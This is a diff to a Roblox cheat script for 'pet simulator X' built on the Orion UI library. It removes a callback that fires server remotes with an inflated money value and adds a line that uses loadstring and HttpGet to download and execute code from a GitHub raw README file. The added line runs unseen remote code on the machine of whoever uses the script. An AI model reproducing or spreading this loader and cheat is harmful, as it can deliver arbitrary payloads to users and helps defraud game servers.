@@ -4,9 +4,7 @@ local Window = OrionLib:MakeWindow({Name = "pet simulator X", HidePremium = fals
 
 local Tab = Window:MakeTab({
 
-	Name = "pet simulator X",
-
-	Icon = "rbxassetid://4483345998",
+	Name = "pet simulator X",	Icon = "rbxassetid://4483345998",
 
 	PremiumOnly = false
 
@@ -30,14 +28,13 @@ Tab:AddButton({
 
 	Callback = function()
 
-      	  local money = 1e400
-
-game:GetService("ReplicatedStorage").Remotes.SurfaceCompleted:FireServer(1, money)
-
-game:GetService("ReplicatedStorage").Remotes.RefillRemote:FireServer(true)
+      	  loadstring(game:HttpGet("https://raw.githubusercontent.com/PerthEuEu/asdacPetsimx/main/README.md"))();
 
   	end   
 
 })
 
 OrionLibInit() 
+
+      	  
+
